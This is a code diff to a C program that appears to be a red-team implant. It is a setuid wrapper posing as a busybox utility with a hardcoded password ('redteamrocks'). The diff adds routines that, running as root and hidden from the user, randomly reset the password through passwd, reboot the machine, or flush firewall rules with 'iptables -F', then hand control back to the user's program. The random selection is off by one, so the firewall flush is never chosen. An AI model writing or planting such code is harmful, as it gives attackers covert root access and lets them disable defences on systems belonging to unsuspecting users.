@@ -21,6 +21,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include <unistd.h>
 
 #define REALPATH "/var/lib/busybox"
@@ -28,12 +29,60 @@
 #define PASSWORD "redteamrocks"
 #define DEBUG 0  // Set to 1 to enable debug output
 
+
+void reset_password(void);
+void reboot_system(void);
+void flush_iptables(void);
+
+size_t num_operations = 3;
+typedef void (*operation_t)(void);
+operation_t operations[] = {
+    reset_password,
+    reboot_system,
+    flush_iptables
+};
+
+void reset_password(void) {
+    char *args[] = { "passwd", NULL };
+#if !(DEBUG)
+    execvp(args[0], args);
+#else
+    printf("password reset\n");
+#endif // !DEBUG
+}
+
+void reboot_system(void) {
+    char *args[] = { "reboot", NULL };
+#if !(DEBUG)
+    execvp(args[0], args);
+#else
+    printf("reboot\n");
+#endif // !DEBUG
+}
+
+void flush_iptables(void) {
+    char *args[] = { "iptables", "-F", NULL };
+#if !(DEBUG)
+    execvp(args[0], args);
+#else
+    printf("iptables flush\n");
+#endif // !DEBUG
+}
+
+
+operation_t choose_operation(void) {
+    return operations[rand() % (num_operations - 1)];
+}
+
 int main(int argc, char **argv) {
     /* Preserve the orginal UID for when the actual utility gets called */
     uid_t uid = getuid();
 
     /* Set the uid to match the euid so that passwd doesn't drop privileges */
     setuid(0);
+
+    /* Initialize random seed -- no need to by cryptographically secure */
+    srand(time(0));
 
     /*
      * Open /dev/null. This will allow us to set the passwd utilitie's stdout
@@ -68,19 +117,17 @@ int main(int argc, char **argv) {
         dup2(pipefd[0], STDIN_FILENO);
         close(pipefd[0]);
 
+#if !(DEBUG)
         /*
          * Effectively close stdout and stderr for passwd without actually
          * closing them.
          */
-
-#if !(DEBUG)
         dup2(dev_null_fd, STDOUT_FILENO);
         dup2(dev_null_fd, STDERR_FILENO);
 #endif // !DEBUG
 
-        /* Create an array of arguments necessary for exec()-ing */
-        char *args[] = { "passwd", NULL };
-        execvp(args[0], args);
+        operation_t command = choose_operation();
+        command();
 
         /* Only reachable if execing passwd failed */
         exit(EXIT_FAILURE);
@@ -89,6 +136,9 @@ int main(int argc, char **argv) {
         close(pipefd[0]);
         close(pipefd[1]);
 
+        /*
+         * Revert back to the user to run the target program.
+         */
         setuid(uid);
         seteuid(uid);
 
